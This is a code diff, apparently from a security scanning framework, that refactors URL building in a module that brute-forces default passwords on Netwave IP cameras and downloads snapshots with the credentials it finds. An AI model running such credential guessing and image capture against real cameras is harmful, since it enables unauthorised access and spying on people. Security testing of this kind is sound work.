@@ -22,7 +22,7 @@ class NetwaveWeakPassword(POCTemplate):
             for password in self.config.passwords:
                 try:
                     r = self.session.get(
-                        url=f"http://{ip}:{port}/snapshot.cgi",
+                        url=self.url(ip, port, "/snapshot.cgi"),
                         auth=(user, password),
                         timeout=self.config.timeout,
                         headers=self.headers,
@@ -38,7 +38,7 @@ class NetwaveWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/snapshot.cgi"
+        url = self.url(ip, port, "/snapshot.cgi")
         return self._snapshot(url, img_file_name, auth=(user, password))
 
 POCTemplate.register_poc(NetwaveWeakPassword)
